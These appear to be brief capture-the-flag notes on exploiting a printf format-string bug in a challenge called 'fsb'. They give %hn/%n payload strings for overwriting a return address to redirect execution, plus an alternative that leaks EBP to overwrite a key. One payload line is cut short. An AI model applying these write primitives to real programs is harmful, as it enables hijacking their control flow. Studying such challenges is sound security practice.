we will overwrite the return address of fsb
it is stored at offset 76 from our stack leak
we convinetely get 4 different calls to printf
we can use each call to overwrite one of the 4 bytes that make up the return address, to redirect code execution
all we have to do is pad(remember little endian)
we will redirect to 0x0804869f
we will do it in 2 writes, since %n was built for ints, and the smallest int specifier is %hn.
%[LSB in decimal]x%19
%65x%38$hn
%1x%39$hn
%[LSB+1 in decimal]x



altarnative method: find EBP and overwrite key

EBP = %18$x
distance = 72/4  + (0xffffd6d8 - EBP)/4

First, leak EBP : %18$x
Then, write to offset (the value 0x0a=10=ENTER): %10x%distance$n
